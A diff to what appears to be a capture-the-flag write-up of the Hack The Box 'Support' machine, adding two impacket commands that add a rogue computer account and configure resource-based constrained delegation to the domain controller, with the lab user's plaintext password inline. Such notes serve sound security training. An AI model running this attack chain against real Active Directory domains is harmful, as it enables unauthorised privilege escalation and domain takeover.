@@ -91,6 +91,13 @@ you can  check the bloodhound data and you can see that user `support` is in the
 ![[Pasted image 20250506195053.png]]
 
 
+**impacket**
+add computer
+`impacket-addcomputer -method SAMR -computer-name 'YAWA' -computer-pass 'YAWA KA' -dc-host 'dc.support.htb' 'support.htb/support:Ironside47pleasure40Watchful'`
+
+`impacket-rbcd -delegate-from 'YAWA$' -delegate-to 'DC$' -action 'write' 'support.htb' 'support.htb/support:Ironside47pleasure40Watchful'   `
+
+
 
 ---
 <h3>QUESTIONS</h3>
